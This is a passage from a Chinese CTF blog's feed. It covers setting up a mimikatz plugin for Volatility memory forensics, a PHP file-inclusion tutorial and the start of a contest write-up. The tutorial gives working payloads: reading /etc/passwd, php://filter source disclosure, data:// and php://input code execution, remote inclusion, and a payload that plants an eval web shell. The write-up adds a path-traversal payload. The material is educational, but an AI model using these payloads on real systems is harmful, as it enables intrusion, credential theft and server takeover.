class="string">&quot;Domain&quot;</span>, <span class="string">&quot;16&quot;</span>),</span><br><span class="line">                              (<span class="string">&quot;Password&quot;</span>, <span class="string">&quot;40&quot;</span>)])</span><br><span class="line">    <span class="keyword">for</span> cred <span class="keyword">in</span> self.credentials_obj.credentials:</span><br><span class="line">      self.table_row(</span><br><span class="line">          outfd, cred.module, cred.username, cred.domain, cred.pwd)</span><br></pre></td></tr></table></figure><p>0x03：将准备好的mimikatz.py移动到插件目录，直接复制即可，目录结构都是一样的（除非改过）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv mimikatz.py /usr/lib/python2.7/dist-packages/volatility/plugins/</span><br><span class="line">chmod 777 /usr/lib/python2.7/dist-packages/volatility/plugins/mimikatz.py</span><br></pre></td></tr></table></figure><p>0x04：安装插件所需要的第三方库</p><blockquote><p>第一种方法：</p><p>​    pip uninstall construct                                    //删除原有版本</p><p>​    pip install construct==2.5.5-reupload          //安装指定版本</p></blockquote><p>此时，如果库安装的非常成功，恭喜，你的mimikatz插件可以使用了，快去用它提取别人镜像里的明文密码吧~~</p><p>如果….你都看到了这里，那你还真是个小倒霉鬼，别慌  我还有第二种方法</p><p>第一种方法没有安装成功一般都是因为网络连接问题造成的，还有可能是玄学问题</p><p><strong>第二种方法</strong></p><p>需要两个文件的下载链接：链接：<a href="https://pan.baidu.com/s/1dQsJwq4ff93KXvYHdoFv7w">https://pan.baidu.com/s/1dQsJwq4ff93KXvYHdoFv7w</a>   提取码：1234</p><p>文件很小，不用担心下载速度问题</p><p>首先，我的机器上有construct这个库，版本也对，我先将它卸载掉</p><p><img src="/images/volatility/1.png"></p><p>此时mimikatz插件是用不了的，因为缺少第三方库报错了</p><p><img src="/images/volatility/2.png"></p><p>缺库？缺啥补啥，我把construct-2.5.5的库给导出来了，手动解压移动到指定的目录就行，目录是固定的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv construct-2.5.5.dist-info /usr/local/lib/python2.7/dist-packages/</span><br></pre></td></tr></table></figure><p><img src="/images/volatility/3.png"></p><p>此时运行还是说缺少库，明明添加了，却还是没用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv construct/ /usr/local/lib/python2.7/dist-packages/</span><br></pre></td></tr></table></figure><p><img src="/images/volatility/2.png"></p><p>那我们将construct库也用同样的方法手动解压移动到指定目录</p><p><img src="/images/volatility/4.png"></p><p>此时，我们可以成功运行mimikatz插件了，到此就结束了。快去用它提取别人镜像里的明文密码吧~~</p><p><img src="/images/volatility/5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;首先介绍一下我喜欢用的两个工具&lt;/p&gt;
&lt;p&gt;Dumpit-github下载：&lt;a href=&quot;https://raw.githubuser</summary>
      
    
    
    
    <category term="MISC" scheme="http://blog.falsectf.top/categories/MISC/"/>
    
    
    <category term="MISC" scheme="http://blog.falsectf.top/tags/MISC/"/>
    
    <category term="取证" scheme="http://blog.falsectf.top/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>WEB-文件包含-学习踩坑</title>
    <link href="http://blog.falsectf.top/2020/07/26/bf2843ff.html"/>
    <id>http://blog.falsectf.top/2020/07/26/bf2843ff.html</id>
    <published>2020-07-26T05:43:35.000Z</published>
    <updated>2021-01-02T01:28:55.296Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新…</p><p>还在写，先所锁上了    持续更新…</p><p>以下函数语法、参数等信息均来自<a href="https://www.w3school.com/">https://www.w3school.com</a></p><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><p><strong>include()</strong></p><p><strong>include_once()</strong></p><p><strong>require()</strong></p><p><strong>require_once()</strong></p><p>功能：</p><ul><li>通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。</li><li>上面四个函数不仅可以读取包含文件的内容，还能**<font color="ff0000">把读取文件的内容当作php代码执行</font>**</li><li>xx_once()与include()语句完全相同，唯一区别是PHP会检查该文件是否已经被包含过，如果是则不再次包含</li></ul><p>include 和 require 语句是相同的，除了错误处理方面：</p><ul><li>require 会生成致命错误（E_COMPILE_ERROR）并<strong>停止脚本</strong></li><li>include 只生成警告（E_WARNING），并且<strong>脚本会继续</strong></li></ul><p>语法：</p><ul><li>include $file;  或  include ‘filename’;</li><li>include($file); 或  include(‘filename’);</li></ul><p><strong>file_get_content()</strong></p><p><strong>注意：此函数无法自动输出，文件包含漏洞中需要配合打印函数使用</strong></p><p>功能：file_get_contents() 函数把整个文件读入一个字符串中。</p><p>语法：<code>file_get_contents(path,include_path,context,start,max_length)</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr><tr><td align="left">start</td><td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td></tr><tr><td align="left">max_length</td><td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td></tr></tbody></table><p><strong>file()</strong></p><p>功能：file() 函数把整个文件读入一个<strong>数组</strong>中。</p><p><strong>注意：此函数无法自动输出，文件包含漏洞中需要配合打印函数使用</strong></p><p>语法：<code>file(path,include_path,context)</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">必需。规定要读取的文件。</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr></tbody></table><h2 id="漏洞形成"><a href="#漏洞形成" class="headerlink" title="漏洞形成"></a>漏洞形成</h2><p>比较常见的读取文件内容的函数有上诉几个(应该还有其他的，这几个比较常见)</p><p>函数在使用过程中，由于使用不当导致包含的<strong>文件名可控</strong>，如下👇</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此代码中include()函数包含的是file传入的参数，该参数可由用户任意控制，就造成了文件包含漏洞</p><p>其他形式的文件包含代码案例👇</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">require</span> <span class="variable">$file</span>;  <span class="comment"># include、require函数自动输入文件内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>); <span class="comment">#需要配合打印函数</span></span><br><span class="line"></span><br><span class="line">var_dump(file(<span class="variable">$file</span>)); <span class="comment">#需要配合打印数组函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h3><p>读取一些敏感文件：<a href="http://127.0.0.1/about.php?file=/etc/passwd">http://127.0.0.1/about.php?file=/etc/passwd</a></p><p>在CTF中在没有过滤的情况下可直接读flag：<a href="http://127.0.0.1/about.php?file=/flag">http://127.0.0.1/about.php?file=/flag</a></p><p>或者读取一些需要的信息，知道文件的路径即可…</p><h3 id="进阶利用"><a href="#进阶利用" class="headerlink" title="进阶利用"></a>进阶利用</h3><p>首先介绍两个php.ini的中关于文件包含的配置</p><p>官方文档：<a href="https://www.php.net/manual/zh/filesystem.configuration.php">https://www.php.net/manual/zh/filesystem.configuration.php</a></p><p>all_url_include在php 5.2以后添加，为了安全起见默认设置如下表👇</p><p>allow_url_include为Off状态下，include等函数无法进行远程文件包含（?file=<a href="http://xxxxx)/">http://xxxxx）</a></p><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>allow_url_fopen</td><td>On</td><td>On</td></tr><tr><td>allow_url_include</td><td>Off</td><td>Off</td></tr></tbody></table><p>无论<strong>allow_url_fopen</strong>与<strong>allow_url_include</strong>是否为On或Off，都不会影响本地文件包含</p><h3 id="伪协议简介"><a href="#伪协议简介" class="headerlink" title="伪协议简介"></a>伪协议简介</h3><p>经常利用的有如下几个，其他可自行百度搜索关键字{PHP伪协议}</p><ul><li>file://    ——访问本地文件系统，需要跟上绝对路径</li><li>http://  ——访问HTTP(s)网站，网站的某个页面地址即可</li><li>php://  ——访问各个输入/输出流</li><li>zlib://   ——压缩流</li><li>data:// ——数据流</li><li>phar:// ——php归档</li></ul><h3 id="0x01-file"><a href="#0x01-file" class="headerlink" title="0x01 file://"></a>0x01 file://</h3><p>注意：file伪协议后必须跟上文件的<strong>绝对路径</strong></p><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>allow_url_fopen</td><td>On/Off</td><td>On/Off</td></tr><tr><td>allow_url_include</td><td>On/Off</td><td>On/Off</td></tr></tbody></table><p>在双Off的配置下也可以使用的伪协议,可以读取系统上的文件</p><p>payload1：<a href="http://127.0.0.1/1.php?file=file:///flag">http://127.0.0.1/1.php?file=file:///flag</a></p><p>payload2：<a href="http://127.0.0.1/1.php?file=file:///var/www/html/test.txt">http://127.0.0.1/1.php?file=file:///var/www/html/test.txt</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.txt内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#1.php内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#因为此时用的是include()函数，可以将读取的文件内容解析为php代码，所以页面会显示phpinfo页面</span></span><br><span class="line"><span class="comment">#如果此时用的是file()、file_get_contents()函数只会读取文件内容，无法解析其中代码</span></span><br></pre></td></tr></table></figure><p><img src="/images/WEB/include/include-1.png"></p><h3 id="0x02-http"><a href="#0x02-http" class="headerlink" title="0x02 http://"></a>0x02 http://</h3><p>通过文件包含的方式，将目标网站的内容包含到(展示)到此网页中</p><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>allow_url_fopen</td><td>On/Off</td><td>On/Off</td></tr><tr><td>allow_url_include</td><td>On</td><td>On</td></tr></tbody></table><p>简单利用：包含目标网站，此方法可以验证网站是否存在远程文件包含漏洞</p><p><img src="/images/WEB/include/include-2.png"></p><p>上诉问题如果存在，则可以利用远程文件包含进行getshell</p><ol><li>在自己的公网机器的web目录新建一个xxx.txt——&gt;内容为一句话木马</li><li>访问<a href="http://127.0.0.1/1.php?file=http://xxx.com/xxx.txt">http://127.0.0.1/1.php?file=http://xxx.com/xxx.txt</a></li><li>使用蚁剑或菜刀等工具连接</li></ol><p>下方截图演示，其中test.txt的内容为：<code>&lt;?php phpinfo();?&gt;</code>，在本地解析执行，返回了phpinfo页面</p><p>远程包含的文件名一定<strong>不要是.php之类的后缀</strong>，因为这样所包含的文件是目标网站解析后的结果</p><p><img src="/images/WEB/include/include-3.png"></p><h3 id="0x03-php-filter"><a href="#0x03-php-filter" class="headerlink" title="0x03 php://filter"></a>0x03 php://filter</h3><p>官方手册：<a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p><p><strong>描述：</strong></p><blockquote><p>php://filter 是一种元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>、 <a href="https://www.php.net/manual/zh/function.file.php">file()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p></blockquote><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>allow_url_fopen</td><td>On/Off</td><td>On/Off</td></tr><tr><td>allow_url_include</td><td>On/Off</td><td>On/Off</td></tr></tbody></table><hr><center>php://fileter参数</center><table><thead><tr><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>resource=&lt;要过滤的数据流&gt;</em></td><td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td align="left"><em>read=&lt;读链的筛选列表&gt;</em></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（*|*）分隔。</td></tr><tr><td align="left"><em>write=&lt;写链的筛选列表&gt;</em></td><td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（*|*）分隔。</td></tr><tr><td align="left"><em>&lt;；两个链的筛选列表&gt;</em></td><td align="left">任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>语句组成：php://filter/<strong>(read/write)</strong>=<strong>过滤器列表(多个用|分隔)</strong>/resource=<strong>文件名</strong></p><hr><center>常用的过滤器</center><table><thead><tr><th>过滤器</th><th>功能</th></tr></thead><tbody><tr><td>convert.base64-encode</td><td>将文件内容进行BASE64编码后输出</td></tr><tr><td>string.toupper</td><td>以大写字母输出所读文件的全部内容</td></tr><tr><td>string.rot13</td><td>将文件内容进行ROT13加密后输出</td></tr></tbody></table><p>更多关于php://filter的描述请阅读官方手册，下方列举一些常见的利用方式</p><p><strong>1.读取文件内容</strong></p><p>payload：<code>http://127.0.0.1/1.php?file=php://filter/resource=/etc/passwd</code></p><p>此方法与直接?file=/etc/passwd几乎没有任何区别，故此作用不大</p><p><strong>2.编码读取文件</strong></p><p>payload1：<code>http://127.0.0.1/1.php?file=php://filter/read=convert.base64-encode/resource=2.php</code></p><p>这里将读取文件内容进行<strong>base64</strong>编码后输出</p><p>payload2：<code>http://127.0.0.1/1.php?file=php://filter/read=string.rot13/resource=2.php</code></p><p>这里将读取文件内容进行<strong>ROT13</strong>加密后输出</p><p>payload3：<code>http://127.0.0.1/1.php?file=php://filter/read=string.toupper|string.rot13/resource=2.php</code></p><p>两个过滤器同时使用，<strong>用 | 分隔</strong>，输出结果为<strong>ROT13加密</strong>后的大写字母</p><p><strong>3.适用函数</strong></p><table><thead><tr><th>函数名</th><th>是否需要配合打印函数</th></tr></thead><tbody><tr><td>include()</td><td>否(自动输出)</td></tr><tr><td>include_once()</td><td>否(自动输出)</td></tr><tr><td>require()</td><td>否(自动输出)</td></tr><tr><td>require_once()</td><td>否(自动输出)</td></tr><tr><td>readfile()</td><td>否(自动输出)</td></tr><tr><td>file()</td><td>是(返回结果为<strong>数组</strong>)</td></tr><tr><td>file_get_contents()</td><td>是(返回结果为字符串)</td></tr><tr><td><strong>目前只了解到上面这些</strong></td><td></td></tr></tbody></table><h3 id="0x04-php-input"><a href="#0x04-php-input" class="headerlink" title="0x04 php://input"></a>0x04 php://input</h3><p>官方手册：<a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p><p><strong>描述：</strong></p><blockquote><p>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 <em>enctype=”multipart/form-data”</em> 的时候 php://input 是无效的。</p></blockquote><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>allow_url_fopen</td><td>On/Off</td><td>On/Off</td></tr><tr><td>allow_url_include</td><td><strong>On</strong></td><td><strong>On</strong></td></tr></tbody></table><p>要想利用php://input伪协议，allow_url_include必须为On，allow_url_fopen无所谓</p><p><strong>1.利用演示</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url：http://127.0.0.1/1.php?file=php://input</span><br><span class="line">[POST data]</span><br><span class="line">&lt;?php  phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>利用POST传输数据，内容要符合php代码语法格式，这样就可以造成任意代码执行</p><p>php代码根据自己的想法去修改即可，这里只是为了验证可用性，所以使用了phpinfo();</p><p><img src="/images/WEB/include/include-4.png"></p><p><strong>利用php://input   写入一句话</strong></p><p>会在网站根目录下生成一个false.php，内容是后面的一句话，之后可以用🐜🗡或🔪连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url：http://127.0.0.1/1.php?file=php://input</span><br><span class="line">[POST data]</span><br><span class="line">&lt;?php  fputs(fopen(&quot;false.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><strong>2.适用函数</strong></p><table><thead><tr><th>函数名</th><th>是否需要配合打印函数</th></tr></thead><tbody><tr><td>include()</td><td>否(自动输出)</td></tr><tr><td>include_once()</td><td>否(自动输出)</td></tr><tr><td>require()</td><td>否(自动输出)</td></tr><tr><td>require_once()</td><td>否(自动输出)</td></tr></tbody></table><h3 id="0x05-zip"><a href="#0x05-zip" class="headerlink" title="0x05 zip://"></a>0x05 zip://</h3><p>官方文档：<a href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http://127.0.0.1/1.php?file=zip://C:/phpStudy/WWW/shell.png%23shell</span><br></pre></td></tr></table></figure><h3 id="0x06-data"><a href="#0x06-data" class="headerlink" title="0x06 data://"></a>0x06 data://</h3><p>官方手册：<a href="https://www.php.net/manual/zh/wrappers.data.php">https://www.php.net/manual/zh/wrappers.data.php</a></p><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>allow_url_fopen</td><td><strong>On</strong></td><td><strong>On</strong></td></tr><tr><td>allow_url_include</td><td><strong>On</strong></td><td><strong>On</strong></td></tr></tbody></table><p><strong>1.利用演示</strong></p><p>下面一共列举了10种payload，同一个函数可以有以下10种不同的方式来执行</p><blockquote><p><strong>data:text/plain,</strong></p><p>payload1：<a href="http://127.0.0.1/1.php?file=data:text/plain">http://127.0.0.1/1.php?file=data:text/plain</a>,&lt;?php phpinfo();</p><p>payload2：<a href="http://127.0.0.1/1.php?file=data:text/plain">http://127.0.0.1/1.php?file=data:text/plain</a>,&lt;?php phpinfo()?&gt;</p><p>payload3：<a href="http://127.0.0.1/1.php?file=data:text/plain">http://127.0.0.1/1.php?file=data:text/plain</a>,&lt;?php phpinfo();?&gt;</p><p>payload4：<a href="http://127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==">http://127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</a></p><p>payload5：<a href="http://127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/1.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p><p><strong>data://text/plain,</strong></p><p>payload6：<a href="http://127.0.0.1/1.php?file=data://text/plain">http://127.0.0.1/1.php?file=data://text/plain</a>,&lt;?php phpinfo();</p><p>payload7：<a href="http://127.0.0.1/1.php?file=data://text/plain">http://127.0.0.1/1.php?file=data://text/plain</a>,&lt;?php phpinfo()?&gt;</p><p>payload8：<a href="http://127.0.0.1/1.php?file=data://text/plain">http://127.0.0.1/1.php?file=data://text/plain</a>,&lt;?php phpinfo();?&gt;</p><p>payload9：<a href="http://127.0.0.1/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==">http://127.0.0.1/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</a></p><p>payload10：<a href="http://127.0.0.1/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p></blockquote><p>这里总结一下10种payload的特殊情况👇</p><ol><li>在不进行base64编码时，上述1-3，6-8共6种情况可以执行，其中 <code>&lt;?php phpinfo()</code>不能执行（此时没有；）</li><li>在进行base64编码时，上述4-5，9-10共4种情况可以执行，其中<code>&lt;?php phpinfo();?&gt;</code>不能执行 （此时有；）</li><li>在进行base64编码时，上述4-5，9-10共4种情况可以执行，其中<code>&lt;?php phpinfo()</code>不能执行 （此时没有；）</li></ol><p>表格总结</p><table><thead><tr><th>普通</th><th>base64</th><th>是否可执行</th></tr></thead><tbody><tr><td>&lt;?php phpinfo();</td><td>&lt;?php phpinfo();</td><td>均可执行</td></tr><tr><td>&lt;?php phpinfo()?&gt;</td><td>&lt;?php phpinfo()?&gt;</td><td>均可执行</td></tr><tr><td>&lt;?php phpinfo();?&gt;</td><td>&lt;?php phpinfo();?&gt;</td><td>base64不能执行</td></tr><tr><td>&lt;?php phpinfo()</td><td>&lt;?php phpinfo()</td><td>均不可执行</td></tr></tbody></table><p>还有一种读取图片的利用方法：data://image/jpeg;base64,base64_encode(xxxxxxx)</p><p><strong>2.适用函数</strong></p><table><thead><tr><th>函数名</th><th>是否需要配合打印函数</th></tr></thead><tbody><tr><td>include()</td><td>否(自动输出)</td></tr><tr><td>include_once()</td><td>否(自动输出)</td></tr><tr><td>require()</td><td>否(自动输出)</td></tr><tr><td>require_once()</td><td>否(自动输出)</td></tr></tbody></table><p>其他文件读取函数也可以使用data://伪协议，但是只有上述4种能达到代码执行效果</p><h2 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h2><p><a href="https://buuoj.cn/">https://buuoj.cn/</a></p><p><strong>1.BUUCT——[ACTF2020 新生赛]Include</strong></p><p>打开题目会有一个tips的a标签，点击后跳转到url?file=flag.php，可以猜测存在文件包含漏洞</p><p>利用php://filter任意文件读取，将php代码进行base64编码输出</p><p>payload：?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>解码base64拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDgyN2FhOWQtMjlhYi00NmRhLWI0YTQtYTBmZDk5NDhkNzMxfQo=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;0827aa9d-29ab-46da-b4a4-a0fd9948d731&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th>伪协议</th><th>php版本</th><th>allow_url_fopen</th><th>allow_url_include</th></tr></thead><tbody><tr><td>file://</td><td>&gt;=5.2</td><td>On/Off</td><td>On/Off</td></tr><tr><td>php://filter</td><td>&gt;=5.2</td><td>On/Off</td><td>On/Off</td></tr><tr><td>zip://</td><td>&gt;=5.2</td><td>On/Off</td><td>On/Off</td></tr><tr><td>php://input</td><td>&gt;=5.2</td><td>On/Off</td><td><strong>On</strong></td></tr><tr><td>http://</td><td>&gt;=5.2</td><td><strong>On</strong></td><td><strong>On</strong></td></tr><tr><td>data://</td><td>&gt;=5.2</td><td><strong>On</strong></td><td><strong>On</strong></td></tr></tbody></table><table><thead><tr><th>伪协议</th><th>测试语句</th></tr></thead><tbody><tr><td>file://</td><td>url?file=file:///etc/passwd</td></tr><tr><td>php://filter</td><td>url?file=php://filter/read=convert.base64-encode/resource=index.php</td></tr><tr><td>zip://</td><td>url?file=zip:///var/www/html/xx.zip%23info.txt</td></tr><tr><td>php://input</td><td>url?file=php://inpit            [POST DATA] &lt;?php phpinfo()?&gt;</td></tr><tr><td>http://</td><td>url?file=<a href="http://xx.xx.xx.xx/phpinfo.txt">http://xx.xx.xx.xx/phpinfo.txt</a>               phpinfo内容-&gt;&lt;?php phpinfo()?&gt;</td></tr><tr><td>data://</td><td>url?file=data://text/plain,&lt;?php phpinfo()?&gt;    <br />或  file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td></tr></tbody></table><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><blockquote><p>phpinfo中值得注意的信息：<a href="https://seaii-blog.com/index.php/2017/10/25/73.html">https://seaii-blog.com/index.php/2017/10/25/73.html</a></p><p>谈一谈php://filter的妙用：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;持续更新…&lt;/p&gt;
&lt;p&gt;还在写，先所锁上了    持续更新…&lt;/p&gt;
&lt;p&gt;以下函数语法、参数等信息均来自&lt;a href=&quot;https://www.w3school.com/&quot;&gt;https://www.w3school.com&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;常见函数&quot;&gt;</summary>
      
    
    
    
    <category term="WEB" scheme="http://blog.falsectf.top/categories/WEB/"/>
    
    
    <category term="WEB" scheme="http://blog.falsectf.top/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯2020-7月月赛</title>
    <link href="http://blog.falsectf.top/2020/07/25/e0a8211b.html"/>
    <id>http://blog.falsectf.top/2020/07/25/e0a8211b.html</id>
    <published>2020-07-25T10:35:44.000Z</published>
    <updated>2020-12-31T11:50:14.450Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB-1-include"><a href="#WEB-1-include" class="headerlink" title="WEB-1-include"></a>WEB-1-include</h3><p>题目链接：<a href="http://183.129.189.60:10009/">http://183.129.189.60:10009</a></p><p>打开题目链接后显示出来的是一张图片，查看网页源代码会在img标签种发现一个/image.php?t=xxxxx&amp;f=base64(xxxx)</p><p>这道题目考点也是文件读取，所以利用点肯定在f这个参数了</p><p>测试发现：</p><p>1.t的时间是递增的，每过1s会+1   所以每次传参也要修改t的值   让我们传入的值与服务器的差值控制在10s内</p><p>2.f参数过滤了../</p><p>3.f参数 x/../ 这种可以绕过../的过滤    x是任意字符</p><p>传入payload之前先发一个随便发一个包看一眼t的时间，然后把t+10左右传入下面payload</p><p>payload：<a href="http://183.129.189.60:10009/image.php?t=%E6%95%B0%E5%AD%97+10s&amp;f=ZmFsc2UvLi4vLi4vLi4vLi4vLi4vZmxhZw==">http://183.129.189.60:10009/image.php?t=数字+10s&amp;f=ZmFsc2UvLi4vLi4vLi4vLi4vLi4vZmxhZw==</a></p><hr><h3 id="MISC-1-welcome"><a href="#MISC-1-welcome" class="headerlink" title="MISC-1-welcome"></a>MISC-1-welcome</h3><p>打开题目附件是两个文件，一个flag.rar  一个red_blue.png，rar文件有密码，从png图片入手</p><p>zsteg分析一下，命令：<code>zsteg red_blue.png</code></p><p><img src="/images/DASCTF-7/MISC1-1.png"></p><p>发现里面藏有一个png图片，提取出来</p><p>命令<code>zsteg red_blue.png  -e &#39;b1,r,lsb,xy&#39; &gt; pass.png</code></p><p>打开图片后发现密码是：<code>/*///1258/*/@#</code></p><p>直接用7z打开后发现有ntfs隐写，直接打开查看内容是一串base85加密</p><p><img src="/images/DASCTF-7/MISC1-2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ao(mgHXo,o0fV&#x27;I2J&quot;^%3&amp;**H@q.MQ1,V%$1GCdB0P&quot;X%0RW</span><br></pre></td></tr></table></figure><p>在线解密得到flag <a href="http://ctf.ssleye.com/base85.html">http://ctf.ssleye.com/base85.html</a></p><hr><h3 id="MISC-2-QrJoker"><a href="#MISC-2-QrJoker" class="headerlink" 